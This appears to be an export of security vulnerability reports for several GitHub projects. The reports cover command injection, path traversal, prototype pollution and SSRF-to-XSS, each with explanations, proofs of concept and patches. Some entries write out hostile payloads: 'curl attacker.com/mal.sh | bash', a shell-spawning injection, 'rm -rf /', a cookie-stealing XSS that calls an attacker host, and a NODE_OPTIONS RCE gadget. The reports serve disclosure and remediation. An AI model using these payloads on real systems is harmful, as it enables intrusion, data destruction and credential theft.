The Flask application should be configured to bind only to the loopback address 127.0.0.1 to limit access exclusively to the local machine. This prevents external systems from reaching the application directly. For production deployments, a production-grade WSGI server like Gunicorn should be used behind a properly secured reverse proxy (e.g., Nginx) with firewall rules restricting traffic. The corrected code should be:
app.run(host='127.0.0.1', port=5000)
This approach ensures that internal services are protected and minimizes the attack surface.
"
171,1745930414888,https://github.com/gallexis/PyTorrent,CWE-319,Medium,2025-04-29T12:40:14.000Z,2025-04-29T14:50:44.000Z,"Explanation: 
Data transmitted via sockets is unencrypted, exposing sensitive information to interception.


POC: 
Attacker uses packet sniffer to capture unencrypted piece requests/transfers.


Root Cause: File peers_manager.py
Lack of TLS/SSL implementation in socket communication (entire PeersManager class).


Exploit Scenario: 
MITM attacker intercepts torrent pieces containing sensitive metadata.


Why it Happens: 
No encryption layer implemented in _read_from_socket/send_to_peer methods.


Security Implications: 
Data theft, traffic manipulation, peer spoofing.


Suggested Fix:
Implement SSL/TLS encryption in the socket communication.

Patch Fix:

import ssl
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile=""server.crt"", keyfile=""server.key"")
secure_socket = context.wrap_socket(peer.socket, server_side=True)"
172,1745931322102,algsoch/BS/blob/0975fdf8ea69faf7f58f51c9891206f5053de58c/grok/tds_app.py#L921,CWE-22: Improper Limitation of a Pathname to a Restricted Directory,Low,2025-04-29T12:55:22.000Z,2025-04-29T14:59:29.000Z,"Root Cause Analysis:

The upload_files() function directly writes the uploaded file to disk using its original filename without checking for duplicates:

file_path = UPLOADS_DIR / file.filename
with open(file_path, ""wb"") as f:
    content = await file.read()
    f.write(content)

Exploit Scenarios:

A malicious user could overwrite critical files uploaded by others, leading to denial of service or data corruption.
An attacker could replace legitimate files with malicious ones, potentially leading to remote code execution.

Security Implications: 1. Data Corruption
2. Denial of Service
3. Remote Code Execution

Suggested Fix: Add a mechanism to generate unique filenames for uploaded files:

import uuid

def secure_filename(filename):
    unique_id = uuid.uuid4().hex
    return f""{unique_id}_{filename}""

@app.post(""/api/upload"")
async def upload_files(files: list[UploadFile] = File(...)):
    for file in files:
        secure_name = secure_filename(file.filename)
        file_path = UPLOADS_DIR / secure_name
        with open(file_path, ""wb"") as f:
            content = await file.read()
            f.write(content)"
173,1745932579678,rndusr/torf/blob/master/torf/_generate.py,CWE-362,High,2025-04-29T13:16:19.000Z,2025-04-29T15:12:21.000Z,"Explanation: 
Race conditions occur when multiple threads access shared resources without proper synchronization, potentially causing unexpected behavior or security vulnerabilities.


POC:
The file handling scenario:

if os.path.exists(filepath):  # Check
    # Attacker replaces file here
    with open(filepath) as f:  # Use
        content = f.read()


Root Cause: 
File https://github.com/rndusr/torf/blob/master/torf/_generate.py
Line 237 (piece_queue.put(QUEUE_CLOSED)) and similar queue operations
Line 149 (self._piece_queue.maxsize = new_maxsize)
Line 272 (self._reader.stop())


Exploit Scenario:
File Replacement: Attackers swap files between existence check and usage (TOCTOU)
State Corruption: Concurrent hash calculations produce invalid results
Resource Starvation: Queue size reduction creates deadlock potential


Why it Happens:
Non-atomic Operations: Queue modifications lack locking mechanisms
Assumed Exclusivity: Code assumes uninterrupted execution between related operations
Improper Error Handling: OOM recovery lacks retry limits


Security Implications:
Privilege Escalation: Manipulate file permissions during verification
Data Integrity Loss: Corrupt torrent metadata during generation
Denial-of-Service: Trigger deadlocks via queue manipulation


Suggested Patch Fix:
Implement proper synchronization:

import threading
queue_lock = threading.Lock()

def _hasher_thread(self):
    with queue_lock:
        task = piece_queue.get(timeout=0.5)
        piece_queue.put(QUEUE_CLOSED)"
174,1745933230563,https://github.com/kgarayev/filesearch,CWE-22,High,2025-04-29T13:27:10.000Z,2025-04-29T15:16:05.000Z,"Explanation: 
The code doesn't sanitize user input for path traversal characters (e.g., ../), allowing attackers to access arbitrary directories.


POC:
When asked for path input, attacker enters:  
../../../../etc/passwd


Root Cause: File filesearch.py
Line 24-25 (path = default_path.home().joinpath(input(...)))
Line 72 (current_path = folders[folder_number])
Line 93 (search(Path('c:/Users/kenan/Desktop/codingnomads')))
Vulnerable due to direct use of unsanitized user input in path operations.


Exploit Scenario:
An attacker could traverse outside the intended directory to access sensitive files (e.g., /etc/passwd on Unix systems).


Why it Happens:
No validation of user-provided paths against parent directory boundaries.


Security Implications:
Unauthorized file system access leading to data theft or system compromise.


Suggested Patch Fix:

from pathlib import Path

def sanitize_path(user_input: str) -> Path:
    base_path = Path.home()
    full_path = (base_path / user_input).resolve()
    
    if not full_path.is_relative_to(base_path):
        raise ValueError(""Path traversal attempt detected"")
    return full_path

# Usage in choose_path():
path = sanitize_path(input(""Enter path: ""))"
175,1745935258674,damonlynch/showinfilemanager/blob/main/src/showinfm/filemanager.py,"CWE-78, CWE-88, CWE-426",Critical,2025-04-29T14:00:58.000Z,2025-04-29T15:22:57.000Z,"The code contains two dangerous security misconfigurations, CWE-78 (Command Injection via Subprocess) and CWE-88 + CWE-426 (Untrusted Search Path) (Windows Subprocess Security)

Severity: Critical (5)

======================================================================

CWE-78:

Explanation: The _launch_file_manager method constructs a shell command string and passes it to subprocess.Popen without proper input sanitization.


POC: 
The self.arg contains user-controlled input (e.g., ; rm -rf / ;), an attacker could execute arbitrary commands.


Root Cause: 
File https://github.com/damonlynch/showinfilemanager/blob/main/src/showinfm/filemanager.py
The vulnerability manifests in _launch_file_manager() through three dangerous patterns:

# Vulnerability Chain
cmd = f""{self.file_manager} {self.arg}{u}""  # Unsafe interpolation
args = shlex.split(cmd) if platform.system() != ""Windows"" else cmd  # Partial mitigation fails on Windows
proc = subprocess.Popen(args)  # Final execution



Exploit Scenario: 
An attacker could manipulate file paths/URIs to inject malicious shell commands when the file manager path contains special characters.
Windows Payload: file_manager = ""malicious.exe & calc.exe""
Impact: Execute arbitrary binaries from user-writable locations
Linux Payload: file_manager = ""nautilus; python3 -c 'import os; os.system(\""/bin/sh\"")' #""
Impact: Full shell access through file manager parameter
URI Injection: path_or_uri = (""; curl attacker.com/mal.sh | bash;"",)
Impact: Remote code execution via network call


Why it Happens: 
String Interpolation Anti-Pattern: Direct inclusion of user input in command strings
Linux: shlex.split() provides partial protection but fails against clever quoting
Windows: Raw string execution enables classic cmd.exe injection


Security Implications: 
Full system compromise via arbitrary command execution.


Suggested Patch Fix:

# Secure Implementation
from shlex import quote

def _launch_file_manager(self, uris_or_paths: List[str]) -> None:
    base_cmd = [self.file_manager]
    if self.arg.strip():
        base_cmd.extend(shlex.split(self.arg))
    
    for u in uris_or_paths:
        # Validate against allowlist pattern
        if not re.match(r'^[a-zA-Z0-9\-_./: ]+$', u):
            raise SecurityException(""Invalid path characters detected"")
            
        args = base_cmd + [u]
        subprocess.Popen(
            args,
            shell=False,
            start_new_session=True,  # Prevent signal inheritance
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )


===================================================================================

CWE-88 + CWE-426 :

Explanation: 
When running on Windows with shell=True (implied via command string), there's potential path hijacking risk if COMSPEC environment variable is unset.


Root Cause: 
File https://github.com/damonlynch/showinfilemanager/blob/main/src/showinfm/filemanager.py
Windows-specific attack vectors enabled by:

# Dangerous Patterns
subprocess.Popen(cmd)  # Implicit shell=True equivalent
os.startfile(d)  # Line 345 - ShellExecute API risks


Exploit Scenario: 
Attacker places malicious cmd.exe in working directory to hijack process execution.
Binary Hijacking: Place malicious explorer.exe in working directory. Abuse PATHEXT precedence (.COM before .EXE)
DLL Side-Loading: Drop malicious SHCORE.DLL in application directory. Leverage Windows DLL search order
ShellExecute Exploits: Craft .LNK files with malicious attributes. Abuse file handler associations


Security Implications: 
Privilege escalation via malicious binary execution.


Suggested Patch Fix:

# Secure Windows Execution
def secure_popen(args):
    if platform.system() == ""Windows"":
        args = [
            str(Path(args[0]).resolve(strict=True)),  # Full path verification
            *[win_quote(arg) for arg in args[1:]]
        ]
        return subprocess.Popen(
            args,
            shell=False,
            creationflags=subprocess.CREATE_NO_WINDOW |
                          subprocess.CREATE_UNICODE_ENVIRONMENT,
            cwd=secure_temp_dir()  # Isolated directory
        )

def win_quote(arg: str) -> str:
    """"""Windows-compatible secure quoting""""""
    if not re.match(r'^[\w\-./: ]+$', arg):
        raise SecurityException(""Invalid argument characters"")
    return f'""{arg}""' if any(c in arg for c in ' &|<>^') else arg"
176,1745935460553,https://github.com/requirejs/requirejs/tree/2.3.6,CWE-1321,Critical,2025-04-29T14:04:20.000Z,2025-04-29T14:53:12.000Z,"Prototype-pollution in RequireJS ≤ 2.3.6 lets untrusted JavaScript overwrite Object.prototype through the loader’s configure() merge logic. From a single crafted requirejs.config() call—or any upstream JSON/URL that the page passes on to that API—an attacker can chain: (1) client-side XSS/auth-bypass, then (2) credential or API-token exfiltration to the backend, and, when the same library is used server-side (SSR/Node), (3) full remote-code-execution gadgets. The issue is rated CVSS 10.0 / “Critical” and is fixed in v2.3.7. 
GitHub
NVD
CVE Database

1 Why it happens
1.1 Vulnerable merge
requirejs/require.js iterates over every key of the user-supplied config:

for (prop in obj) {
  if (hasProp(obj, prop)) { … }   // ≤ 2.3.6
}
The 2024-07-01 patch adds a blacklist: disallowedProps=['__proto__','constructor'] and skips those keys 
GitHub
. Before the patch a payload like {""__proto__"":{""isAdmin"":true}} rewrites Object.prototype (CWE-1321).

1.2 Attack surface
requirejs.config() is commonly fed with:

a literal object in page code,

a JSON blob fetched from the server,

query-string data parsed and forwarded by the SPA router, or

SSR/Node renders that reuse the same requirejs package.

Because the merge is unconditional, any upstream parameter that reaches that call becomes a pollution vector. 
requirejs.org

2 End-to-end exploitation flow
2.1 Client → loader

<script>
fetch('/theme?dark=1')
  .then(r => r.json())
  .then(cfg => requirejs.config(cfg));   // dev shorthand, now weaponised!
</script>
Attacker tampers network response or query string to include:

{""__proto__"":{""sanitizeBypass"":true}}
The value reaches configure(), prototype is polluted.

2.2 Loader → gadget
Client-side gadgets are plentiful:

Sanitizer bypass – many HTML scrubbers use an allow-list object (ALLOWED[tag]). If Object.prototype[tag] is now true, the tag sails through and triggers DOM-XSS 
research.securitum.com
Swissky's InfoSec Adventures
.

Auth logic – if (user.isAdmin)… checks become true everywhere 
Swissky's InfoSec Adventures
.

DoS – overwrite toString or valueOf with a recursive function to freeze the UI 
Vulnerability Finder
.

2.3 Browser → backend
With XSS running in-page the attacker can:

read document.cookie / localStorage tokens;

fetch('/api/transfer', {credentials:'include', …}) to move money or data;

beacon stolen credentials to an off-site server.

Because RequireJS is front-end infrastructure, every module that trusts object-literals is now at risk, widening blast radius. 


3 Server-side chains (Node / SSR)
If the same vulnerable version is installed server-side (for example, in an Express view renderer or build-time script), pollution can be escalated to RCE:


requirejs.config({""__proto__"":{
  env:{NODE_OPTIONS:'--require /tmp/shell.js'}
}});
Node starts the next child-process with attacker-controlled NODE_OPTIONS, achieving arbitrary command execution 
Clean Code Tools
PortSwigger
. Academic work shows universal gadgets in core APIs that let any prototype-pollution bug end in RCE 
USENIX

4 Mitigation & hardening
Upgrade RequireJS to ≥ 2.3.7—the blacklist in eachProp blocks the pollution vector 
GitHub
.

Never pass untrusted payloads straight into requirejs.config. Validate/whitelist keys server-side and client-side.

Apply Content-Security-Policy to curb post-pollution XSS reach.

Scan your server code for universal RCE gadgets or use CodeQL queries that flag prototype pollution merges 
GitHub
.

Patch quickly: once the prototype is poisoned, every object—and every layer of your stack—plays by the attacker’s rules."
177,1745940782512,https://github.com/ChatGPTNextWeb/NextChat/blob/v2.12.3/app/api/webdav/%5B...path%5D/route.ts,CWE-918,High,2025-04-29T15:33:02.000Z,2025-04-29T16:23:24.000Z,"NextChat’s WebDAV proxy endpoint did only a simple startsWith check against allowed URLs, which an attacker could bypass by using domains like webdav.yandex.com.attacker.tld—so the server would fetch arbitrary HTTPS targets (MKCOL, PUT, GET) on the attacker’s behalf. This SSRF lets them reach internal or private resources, then turn around and serve malicious JavaScript through the same proxy, resulting in stored XSS in any user’s browser. The flaw carries a CVSS 3.1 7.4 (High) and was patched in v2.12.4 by switching to strict URL parsing with exact hostname and path-prefix matching. 
NVD
GitHub

Vulnerability Description
NextChat exposes a WebDAV proxy at 
https://github.com/ChatGPTNextWeb/NextChat/blob/v2.12.3/app/api/webdav/%5B...path%5D/route.ts

That accepts an endpoint query parameter and validates it like this:

Line: 26 -30

if (
    !mergedAllowedWebDavEndpoints.some(
      (allowedEndpoint) => endpoint?.startsWith(allowedEndpoint),
  )
{
  return 400;
}
Because startsWith(""https://webdav.yandex.com"") returns true for https://webdav.yandex.com.attacker.tld/…, an attacker-controlled domain passes the check 
Tenable®
. The server then calls fetch(endpoint + path) with no further validation, enabling Server-Side Request Forgery (SSRF) to arbitrary HTTPS URLs (MKCOL, PUT, GET supported) 
NVD
. Furthermore, if the attacker’s WebDAV server serves HTML or JSON containing <script> tags, those responses get relayed back to users, triggering Stored Cross-Site Scripting (XSS) in the NextChat origin 
GitHub
.

Exploitation Details
An attacker can chain SSRF → XSS in two phases:

Bypass and SSRF

Craft a request such as:

swift
Copy
Edit
GET /api/webdav/chatgpt-next-web/backup.json?
    endpoint=https://webdav.yandex.com.attacker.tld/
The startsWith check passes, DNS resolves to the attacker’s server, and NextChat issues a GET, MKCOL, or PUT to any path under that domain 
Tenable®
.

Stored XSS

The attacker’s WebDAV server responds with a malicious payload, for example:

html
Copy
Edit
{""data"":""<img src=x onerror=\""fetch('https://attacker/steal?c='+document.cookie)\"">""}
When a legitimate user later hits the same proxy URL (e.g. to retrieve their backup or attachments), the injected script runs in their browser, stealing session tokens or performing actions under their credentials 
Feedly
.

Because no authentication is required to reach many WebDAV proxy endpoints in typical NextChat deployments, this attack can be launched entirely anonymously, against any running instance reachable on the Internet 
VulDB
.

Impact
Confidentiality – SSRF to internal endpoints exposes private services (metadata APIs, internal dashboards) and lets attackers read secrets (e.g., AWS metadata) 
NVD
.

Integrity – SSRF-supported methods like PUT or MKCOL allow attackers to create or overwrite files on internal servers or attacker-controlled WebDAV shares, tampering with data or configuration 
GitHub
.

Availability – Flooding or corrupting internal services via SSRF can cause denial-of-service, and malformed responses can crash the NextChat proxy route 
Pentest-Tools.com
.

Stored XSS – Relayed malicious scripts execute in every user’s session, enabling full account takeover, UI manipulation, CSRF against APIs under the NextChat origin, and permanent client-side backdoors 
GitHub
Feedly
.

Severity – Rated CVSS 3.1 7.4 (High) by GitHub and NVD, reflecting easy remote attack with substantial impact on confidentiality and integrity 
NVD
CVE
.

Patch & Mitigation
In v2.12.4, NextChat replaced startsWith with robust URL parsing and exact matches:

ts
Copy
Edit
const a = new URL(allowed);
const e = new URL(endpoint);
if (!(e.hostname === a.hostname &&
      e.pathname.startsWith(a.pathname))) {
  return 400;
}
This ensures only exactly the whitelisted WebDAV hosts and path prefixes are allowed, closing both SSRF and XSS vectors 
GitHub
.

Additional defenses:

Restrict proxy methods to GET only.

Enforce strict Content Security Policies to limit script execution in browsers.

Monitor and block unwanted DNS resolutions via egress filters.

Review any other “open proxy” code patterns for similar weaknesses."
